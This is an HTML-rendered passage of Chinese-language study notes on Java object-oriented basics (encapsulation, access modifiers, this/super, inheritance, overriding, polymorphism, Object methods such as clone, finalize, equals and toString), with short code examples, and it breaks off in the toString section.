class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">一种将抽象性函式接口的实现细节部分包装、隐藏起来的方法。封装可以被认为是一个保护屏障，防止该类的代码和数据被外部类定义的代码随机访问   </span></span><br><span class="line"><span class="comment">使用private protected public</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EncapTest</span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> String idNum;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> age;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">getIdNum</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> idNum;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">( <span class="type">int</span> newAge)</span>&#123;</span><br><span class="line">      age = newAge;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String newName)</span>&#123;</span><br><span class="line">      name = newName;</span><br><span class="line">   &#125;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIdNum</span><span class="params">( String newId)</span>&#123;</span><br><span class="line">      idNum = newId;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RunEncap</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">      <span class="type">EncapTest</span> <span class="variable">encap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EncapTest</span>();</span><br><span class="line">      encap.setName(<span class="string">&quot;James&quot;</span>);</span><br><span class="line">      encap.setAge(<span class="number">20</span>);</span><br><span class="line">      encap.setIdNum(<span class="string">&quot;12343ms&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      System.out.print(<span class="string">&quot;Name : &quot;</span> + encap.getName()+ </span><br><span class="line">                             <span class="string">&quot; Age : &quot;</span>+ encap.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>modifier</th><th>本类内</th><th>本包内</th><th>其他包的子类</th><th>其他包的非子类</th></tr></thead><tbody><tr><td>public</td><td>y</td><td>y</td><td>y</td><td>y</td></tr><tr><td>protected</td><td>y</td><td>y</td><td>y</td><td>n</td></tr><tr><td>no modifiter</td><td>y</td><td>y</td><td>n</td><td>n</td></tr><tr><td>private</td><td>y</td><td>n</td><td>n</td><td>n</td></tr></tbody></table><h2 id="关键字this"><a href="#关键字this" class="headerlink" title="关键字this"></a>关键字this</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">10</span>;<span class="comment">//a--&gt;private int a</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;初始化年龄：&quot;</span>+age);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">GetAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;<span class="comment">//this.age--&gt;a</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">Harry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;Harry&#x27;s age is &quot;</span>+Harry.GetAge(<span class="number">12</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="关键字-super"><a href="#关键字-super" class="headerlink" title="关键字 super"></a>关键字 super</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Country</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">value</span><span class="params">()</span> &#123;</span><br><span class="line">       name = <span class="string">&quot;China&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">City</span> <span class="keyword">extends</span> <span class="title class_">Country</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">value</span><span class="params">()</span> &#123;</span><br><span class="line">    name = <span class="string">&quot;Shanghai&quot;</span>;</span><br><span class="line">    <span class="built_in">super</span>.value();      <span class="comment">//调用父类的方法</span></span><br><span class="line">    System.out.println(name);</span><br><span class="line">    System.out.println(<span class="built_in">super</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       City c=<span class="keyword">new</span> <span class="title class_">City</span>();</span><br><span class="line">       c.value();</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//extends</span></span><br><span class="line"><span class="comment">//在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123; </span><br><span class="line">    <span class="keyword">private</span> String name;   </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id; </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(String myName, <span class="type">int</span> myid)</span> &#123; </span><br><span class="line">        <span class="comment">//初始化属性值</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;  <span class="comment">//吃东西方法的具体实现  &#125; </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span> &#123; <span class="comment">//睡觉方法的具体实现  &#125; </span></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Penguin</span>  <span class="keyword">extends</span>  <span class="title class_">Animal</span>&#123; </span><br><span class="line">&#125;</span><br><span class="line">        </span><br><span class="line"><span class="comment">//implements</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sleep</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">B</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">implements</span> <span class="title class_">A</span>,B &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="final-关键字"><a href="#final-关键字" class="headerlink" title="final 关键字"></a>final 关键字</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用 final 关键字声明类，就是把类定义定义为最终类，不能被继承，或者用于修饰方法，该方法不能被子类重写</span></span><br><span class="line"><span class="keyword">final</span> class 类名 &#123;<span class="comment">//类体&#125;</span></span><br></pre></td></tr></table></figure><h2 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">重写是子类对父类的允许访问的方法的实现过程进行重新编写, 返回值和形参都不能改变</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;动物可以移动&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;狗可以跑和走&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDog</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">      <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>(); <span class="comment">// Animal 对象</span></span><br><span class="line">      <span class="type">Animal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(); <span class="comment">// Dog 对象</span></span><br><span class="line"> </span><br><span class="line">      a.move();<span class="comment">// 执行 Animal 类的方法</span></span><br><span class="line"> </span><br><span class="line">      b.move();<span class="comment">//执行 Dog 类的方法</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">编译结果：</span></span><br><span class="line"><span class="comment">动物可以移动</span></span><br><span class="line"><span class="comment">狗可以跑和走</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;动物可以移动&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span> <span class="keyword">extends</span> <span class="title class_">Animal</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">move</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;狗可以跑和走&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bark</span><span class="params">()</span>&#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;狗可以吠叫&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestDog</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span>&#123;</span><br><span class="line">      <span class="type">Animal</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Animal</span>(); <span class="comment">// Animal 对象</span></span><br><span class="line">      <span class="type">Animal</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>(); <span class="comment">// Dog 对象</span></span><br><span class="line"> </span><br><span class="line">      a.move();<span class="comment">// 执行 Animal 类的方法</span></span><br><span class="line">      b.move();<span class="comment">//执行 Dog 类的方法</span></span><br><span class="line">      b.bark();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">编译结果：</span></span><br><span class="line"><span class="comment">TestDog.java:30: cannot find symbol</span></span><br><span class="line"><span class="comment">symbol  : method bark()</span></span><br><span class="line"><span class="comment">location: class Animal</span></span><br><span class="line"><span class="comment">                b.bark();</span></span><br><span class="line"><span class="comment">                 ^</span></span><br><span class="line"><span class="comment">该程序将抛出一个编译错误，因为b的引用类型Animal没有bark方法。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//适用于方法，不适用与属性 向上转型</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;  </span><br><span class="line">    <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cat</span> <span class="keyword">extends</span> <span class="title class_">Animal</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;吃鱼&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">work</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;抓老鼠&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Animal a=<span class="keyword">new</span> <span class="title class_">Cat</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"> <span class="comment">//向下转型</span></span><br><span class="line">       <span class="type">Cat</span> <span class="variable">c</span> <span class="operator">=</span> (Cat)a</span><br><span class="line">           </span><br><span class="line"><span class="comment">//instanceof</span></span><br><span class="line">           <span class="keyword">if</span> (a <span class="keyword">instanceof</span> Cat) <span class="comment">//判断a是否是猫</span></span><br></pre></td></tr></table></figure><h2 id="Object类"><a href="#Object类" class="headerlink" title="Object类"></a>Object类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Java.lang.Object</span></span><br><span class="line"><span class="comment">//任何Java类（除Object类）都直接或间接的继承与Object类</span></span><br><span class="line"><span class="comment">//Object类称为Java类的根父类</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Object clone() 方法用于创建并返回一个对象的拷贝。</span></span><br><span class="line"><span class="comment">/*clone 方法是浅拷贝，对象内属性引用的对象只会拷贝引用地址，而不会将引用的对象重新分配内存，相对应的深拷贝则会连引用的对象也新重新创建*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunoobTest</span> <span class="keyword">implements</span> <span class="title class_">Cloneable</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 声明变量</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> likes;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 创建对象</span></span><br><span class="line">        <span class="type">RunoobTest</span> <span class="variable">obj1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RunoobTest</span>();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 初始化变量</span></span><br><span class="line">        obj1.name = <span class="string">&quot;Runoob&quot;</span>;</span><br><span class="line">        obj1.likes = <span class="number">111</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 打印输出</span></span><br><span class="line">        System.out.println(obj1.name); <span class="comment">// Runoob</span></span><br><span class="line">        System.out.println(obj1.likes); <span class="comment">// 111</span></span><br><span class="line"> </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 创建 obj1 的拷贝</span></span><br><span class="line">            <span class="type">RunoobTest</span> <span class="variable">obj2</span> <span class="operator">=</span> (RunoobTest) obj1.clone();</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 使用 obj2 输出变量</span></span><br><span class="line">            System.out.println(obj2.name); <span class="comment">// Runoob</span></span><br><span class="line">            System.out.println(obj2.likes); <span class="comment">// 111</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">以上程序执行结果为：</span></span><br><span class="line"><span class="comment">Runoob</span></span><br><span class="line"><span class="comment">111</span></span><br><span class="line"><span class="comment">Runoob</span></span><br><span class="line"><span class="comment">111</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Object finalize() 方法用于实例被垃圾回收器回收的时触发的操作。</span></span><br><span class="line"><span class="comment">//当 GC (垃圾回收器) 确定不存在对该对象的有更多引用时，对象的垃圾回收器就会调用这个方法。</span></span><br><span class="line"><span class="comment">//语法 protected void finalize()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RunoobTest</span> <span class="keyword">extends</span> <span class="title class_">GregorianCalendar</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 创建 RunoobTest 对象</span></span><br><span class="line">            <span class="type">RunoobTest</span> <span class="variable">cal</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RunoobTest</span>();</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// 输出当前时间</span></span><br><span class="line">            System.out.println(<span class="string">&quot;&quot;</span> + cal.getTime());</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// finalize cal</span></span><br><span class="line">            System.out.println(<span class="string">&quot;Finalizing...&quot;</span>);</span><br><span class="line">            cal.finalize();</span><br><span class="line">            System.out.println(<span class="string">&quot;Finalized.&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">以上程序执行结果为：</span></span><br><span class="line"><span class="comment">Sun Oct 11 11:36:46 CST 2020</span></span><br><span class="line"><span class="comment">Finalizing...</span></span><br><span class="line"><span class="comment">Finalized.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="equals"><a href="#equals" class="headerlink" title="equals()"></a>equals()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//equals() 方法用于将字符串与指定的对象比较。</span></span><br><span class="line"><span class="comment">//String 类中重写了 equals() 方法用于比较两个字符串的内容是否相等。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">使用 == 和 equals() 比较字符串。</span></span><br><span class="line"><span class="comment">String 中 == 比较引用地址是否相同，equals() 比较字符串的内容是否相同：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;              <span class="comment">// String 直接创建</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;Hello&quot;</span>;              <span class="comment">// String 直接创建</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> s1;                   <span class="comment">// 相同引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);  <span class="comment">// String 对象创建</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);  <span class="comment">// String 对象创建</span></span><br><span class="line"> </span><br><span class="line">s1 == s1;         <span class="comment">// true, 相同引用</span></span><br><span class="line">s1 == s2;         <span class="comment">// true, s1 和 s2 都在公共池中，引用相同</span></span><br><span class="line">s1 == s3;         <span class="comment">// true, s3 与 s1 引用相同</span></span><br><span class="line">s1 == s4;         <span class="comment">// false, 不同引用地址</span></span><br><span class="line">s4 == s5;         <span class="comment">// false, 堆中不同引用地址</span></span><br><span class="line"> </span><br><span class="line">s1.equals(s3);    <span class="comment">// true, 相同内容</span></span><br><span class="line">s1.equals(s4);    <span class="comment">// true, 相同内容</span></span><br><span class="line">s4.equals(s5);    <span class="comment">// true, 相同内容</span></span><br></pre></td></tr></table></figure><h2 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">toString() 方法用于返回以一个字符串表示的 Number 对象值。</span></span><br><span class="line"><span class="comment">如果方法使用了原生的数据类型作为参数，返回原生数据类型的 String 对象值。</span></span><br><span class="line"><span class="comment">如果方法有两个参数， 返回用第二个参数指定基数表示的第一个参数的字符串表示形式。</span></span><br><span class="line"><span class="comment">语法  </span></span><br><span class="line"><span class="comment">String toString()</span></span><br><span class="line"><span class="comment">static String toString(int i)</span></span><br><span class="line"><span class="comment">i -- 要转换的整数。</span></span><br><span 